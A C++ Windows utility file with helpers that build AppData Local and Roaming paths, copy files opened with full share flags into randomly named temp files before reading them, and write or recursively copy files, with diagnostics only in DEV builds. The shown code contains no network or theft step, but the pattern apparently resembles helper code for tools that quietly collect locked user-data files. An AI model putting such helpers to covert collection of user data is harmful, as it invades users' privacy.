//
// Created by .1qxz on 06.06.2024.
//

#include <fstream>
#include "Utils.h"

std::string Utils::generateString(size_t length) {
    const std::string characters =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";

    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<std::string::size_type> distribution(0, characters.size() - 1);

    std::string random_string;
    random_string.shrink_to_fit();

    for (size_t i = 0; i < length; ++i) {
        random_string += characters[distribution(generator)];
    }

    return random_string;
}

fs::path Utils::getTemp() {
    return fs::temp_directory_path();
}

fs::path Utils::getLocalPath() {
    return getUserHome() / "AppData" / "Local";
}

fs::path Utils::getRoamingPath() {
    return getUserHome() / "AppData" / "Roaming";
}

fs::path Utils::getUserHome() {
    return {std::getenv("USERPROFILE")};
}

fs::path Utils::getSystemDrive() {
    return {std::getenv("SYSTEMDRIVE")};
}


std::string Utils::readFile(const fs::path &source_path) {
    if(!exists(source_path))
        return "";

    if(is_directory(source_path))
    {
        #if DEV
            std::cout << "Attempt to read file " << source_path.string() << " but its directory!";
        #endif
    }

    fs::path temp_file_path = getTemp() / generateString(20);

    if(!copyFile(source_path, temp_file_path))
        return "";

    std::ifstream file(temp_file_path, std::ios::in | std::ios::binary);
    if (!file) {
        return "";
    }

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    fs::remove(temp_file_path);

    return content;
}

bool Utils::copyFile(const fs::path &from, const fs::path &to) {
    std::string fromWStr = from.string();
    std::string toWStr = to.string();

    // Открываем исходный файл
    HANDLE hSrc = CreateFile(
            fromWStr.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    if (hSrc == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Не удалось открыть исходный файл. Ошибка: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hDst = CreateFile(
            toWStr.c_str(),
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
    );

    if (hDst == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Не удалось создать целевой файл. Ошибка: " << GetLastError() << std::endl;
        CloseHandle(hSrc);
        return false;
    }

    std::vector<char> buffer(8192);
    DWORD bytesRead, bytesWritten;

    // Копируем данные из исходного файла в целевой файл
    while (ReadFile(hSrc, buffer.data(), buffer.size(), &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(hDst, buffer.data(), bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            std::wcerr << L"Ошибка при записи в целевой файл. Ошибка: " << GetLastError() << std::endl;
            CloseHandle(hSrc);
            CloseHandle(hDst);
            return false;
        }
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);

    return true;
}

void Utils::writeFile(const fs::path &path, const std::string &content, bool append) {
    fs::create_directories(path.parent_path());
    std::ofstream file;

    if (append)
        file.open(path, std::ios::out | std::ios::app | std::ios::binary);
    else
        file.open(path, std::ios::out | std::ios::trunc | std::ios::binary);

    if (file.is_open()) {
        file << "\xEF\xBB\xBF";
        file << content;
        file.close();
    }
}

void Utils::copy(const fs::path &src, const fs::path &dst) {
    try {
        if (fs::exists(src) && fs::exists(dst) && fs::is_directory(dst)) {
            fs::path destination = dst / src.filename();
            if (fs::is_directory(src)) {
                fs::copy(src, destination, fs::copy_options::recursive);
            } else if (fs::is_regular_file(src)) {
                fs::copy(src, destination);
            } else {
                #if DEV
                    std::cerr << "Source path is neither a file nor a directory." << std::endl;
                #endif
            }
        } else {
            #if DEV
                std::cerr << "Source or destination path does not exist or destination is not a directory." << std::endl;
            #endif
        }
    } catch (fs::filesystem_error& e) {
        #if DEV
            std::cerr << "Filesystem error: " << e.what() << std::endl;
        #endif
    }
}
